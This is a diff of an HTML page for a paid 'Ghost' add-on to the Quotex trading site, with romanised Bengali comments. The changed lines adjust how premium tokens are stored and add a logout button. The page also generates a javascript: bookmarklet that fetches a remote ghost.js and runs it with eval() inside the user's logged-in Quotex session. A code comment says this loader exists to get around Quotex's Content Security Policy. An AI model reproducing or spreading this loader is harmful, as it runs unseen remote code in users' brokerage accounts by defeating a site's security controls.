@@ -383,7 +383,8 @@ body{ padding-bottom:84px; }
 <div style="display:flex;justify-content:space-between;background:#050a12;border:1px solid #17314a;padding:12px;border-radius:10px"><span>Deposit</span><b id="profileDeposit">-</b></div>
 <div style="display:flex;justify-content:space-between;background:#050a12;border:1px solid #17314a;padding:12px;border-radius:10px"><span>Status</span><b id="profileStatus" style="color:#00d49a">-</b></div>
 </div>
-<div style="display:flex;gap:10px;margin-top:14px;flex-wrap:wrap"><a class="btn premium" href="https://t.me/Qx_ghost_bot" target="_blank">Telegram Bot</a><a class="btn" href="https://t.me/premierghos" target="_blank">Join Channel</a></div>
+<div style="display:flex;gap:10px;margin-top:14px;flex-wrap:wrap"><a class="btn premium" href="https://t.me/Qx_ghost_bot" target="_blank">Telegram Bot</a><a class="btn" href="https://t.me/premierghos" target="_blank">Join Channel</a><button class="btn" id="logoutBtn" onclick="localStorage.removeItem('ghost_premium_token'); window.location.href=window.location.origin+window.location.pathname; return false;">Logout - Locked Dekho</button></div>
+<p style="font-size:12px;color:var(--muted);margin-top:8px">Admin Tip: Premium link diye dhukar por normal link e gele ekhon lock dekhabe. Purono browser e jodi premium dekhay, ekbar Logout chap dao ba link er ?access= ongsho kete normal link e dhuko.</p>
 </div></div></section>
 </div>
 </main>
@@ -399,7 +400,7 @@ document.querySelectorAll(".navlinks a").forEach(link => { link.addEventListener
 var _y=document.getElementById("year"); if(_y) _y.textContent=new Date().getFullYear();
 const GHOST_CODE_BASE = `javascript:(function(){window.GHOST_TOKEN='`;
 function getGhostCode(){
-  const token = new URLSearchParams(window.location.search).get('access') || new URLSearchParams(window.location.search).get('token') || localStorage.getItem('ghost_premium_token') || '';
+  const token = new URLSearchParams(window.location.search).get('access') || new URLSearchParams(window.location.search).get('token') || '';
   // FIX: fetch+eval loader - bypasses Quotex CSP script-src which blocks <script src=external>. Single slash, no //ghost.js
   if(token){
     return `javascript:(function(){window.GHOST_TOKEN='${token}';fetch('https://giogram-backend.onrender.com/ghost.js?v='+Date.now()).then(r=>r.text()).then(c=>{eval(c)}).catch(e=>alert('Load Fail: '+e.message))})();`;
@@ -469,10 +470,15 @@ setInterval(updateMarketWatch, 4000);
 // === PREMIUM GATE LOGIC ===
 const API_BASE_GATE = "https://giogram-backend.onrender.com";
 function getToken() {
+  // FIX: Shudhu URL er ?access=TOKEN theke nibe, browser e save korbe na
+  // Age localStorage theke nito, tai ekbar premium link diye dhukle pore normal link diye dhukleo premium dekhaito
+  // Ekhon normal link = lock, premium link = premium - Admin test korte parbe
   const params = new URLSearchParams(window.location.search);
-  return params.get('access') || params.get('token') || params.get('premium') || params.get('id') || localStorage.getItem('ghost_premium_token') || "";
+  return params.get('access') || params.get('token') || params.get('premium') || params.get('id') || "";
 }
 async function checkPremium() {
+  // Purono save kora token thakle clear kore dao - nahole admin er browser e ager member er token theke jabe
+  try{ localStorage.removeItem('ghost_premium_token'); }catch(e){}
   const token = getToken();
   const body = document.body;
   const lockInfo = document.getElementById('lockInfo');
@@ -488,7 +494,7 @@ async function checkPremium() {
     if (j.valid) {
       body.classList.add('premium-unlocked');
       body.classList.remove('premium-locked');
-      localStorage.setItem('ghost_premium_token', token);
+      // Token save korbo na - normal link e lock dekhabe, shudhu premium link e premium
       let b = document.getElementById('premiumBanner');
       if (b) b.innerHTML = `PREMIUM UNLOCKED — ID ${j.data.trader_id} — Deposit $${j.data.amount} — Full Access `;
       console.log("Premium unlocked", j.data);
